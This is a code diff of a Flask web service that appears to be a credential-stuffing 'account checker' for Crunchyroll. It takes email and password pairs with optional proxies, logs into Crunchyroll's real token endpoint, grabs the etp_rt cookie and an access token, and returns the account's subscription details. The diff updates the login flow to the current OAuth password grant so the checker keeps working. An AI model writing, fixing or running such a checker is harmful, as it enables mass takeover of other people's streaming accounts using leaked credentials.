@@ -9,38 +9,54 @@ app = Flask(__name__)
 async def check_crunchyroll(email, password, proxy=None):
     async with httpx.AsyncClient(timeout=30, proxies=proxy if proxy else None) as client:
         try:
+            # 1. Login to get etp_rt cookie
             login_headers = {
+                "Authorization": AUTH_HEADER,
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
-                "Content-Type": "text/plain;charset=UTF-8",
-                "Origin": "https://sso.crunchyroll.com",
-                "Referer": "https://sso.crunchyroll.com/login"
+                "Origin": "https://www.crunchyroll.com",
+                "Referer": "https://www.crunchyroll.com/login",
+                "Content-Type": "application/x-www-form-urlencoded"
             }
-            login_data = {"email": email, "password": password, "eventSettings": {}}
-            login_res = await client.post("https://sso.crunchyroll.com/api/login", json=login_data, headers=login_headers)
-            if login_res.status_code != 200 or "invalid_credentials" in login_res.text:
-                return {"error": "Invalid credentials", "detail": f"{email}:{password}"}, 401
+            login_data = {
+                "grant_type": "password",
+                "username": email,
+                "password": password,
+                "scope": "offline_access"
+            }
+            login_res = await client.post(
+                "https://www.crunchyroll.com/auth/v1/token",
+                data=login_data,
+                headers=login_headers
+            )
+            if login_res.status_code != 200:
+                return {"error": f"Login failed: {login_res.text}"}, 401
 
-            device_id = login_res.cookies.get("device_id")
-            if not device_id:
-                return {"error": "No device_id received"}, 400
+            # 2. Extract the etp_rt cookie
+            etp_rt = login_res.cookies.get("etp_rt")
+            if not etp_rt:
+                return {"error": "etp_rt cookie not found"}, 401
 
-            await asyncio.sleep(1)
-
+            # 3. Use etp_rt cookie to get access_token
             token_headers = {
                 "Authorization": AUTH_HEADER,
                 "Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": login_headers["User-Agent"],
-                "Origin": "https://www.crunchyroll.com",
-                "Referer": "https://www.crunchyroll.com/"
+                "Origin": login_headers["Origin"],
+                "Referer": login_headers["Referer"],
             }
             token_data = {
-                "device_id": device_id,
-                "device_type": "Firefox on Windows",
                 "grant_type": "etp_rt_cookie"
             }
-            token_res = await client.post("https://www.crunchyroll.com/auth/v1/token", data=token_data, headers=token_headers)
+            cookies = {"etp_rt": etp_rt}
+
+            token_res = await client.post(
+                "https://www.crunchyroll.com/auth/v1/token",
+                data=token_data,
+                headers=token_headers,
+                cookies=cookies
+            )
             if token_res.status_code != 200:
-                return {"error": "Token error"}, 401
+                return {"error": "Token error", "response": token_res.text}, 401
 
             js = token_res.json()
             token = js.get("access_token")
@@ -48,14 +64,13 @@ async def check_crunchyroll(email, password, proxy=None):
             if not token or not account_id:
                 return {"error": "Invalid token/account"}, 400
 
-            await asyncio.sleep(1)
-
+            # 4. Get subscription info
             sub_headers = {
                 "Authorization": f"Bearer {token}",
                 "Accept": "application/json",
                 "User-Agent": login_headers["User-Agent"],
-                "Referer": "https://www.crunchyroll.com/",
-                "Origin": "https://www.crunchyroll.com"
+                "Referer": login_headers["Referer"],
+                "Origin": login_headers["Origin"]
             }
 
             sub_res = await client.get(
@@ -68,7 +83,6 @@ async def check_crunchyroll(email, password, proxy=None):
             except Exception:
                 return {"error": "Response was not JSON"}, 502
 
-            # Return the FULL JSON response as you asked
             return data, 200
         except Exception as e:
             return {"error": str(e)}, 500
@@ -139,5 +153,3 @@ def chk():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
-
-          
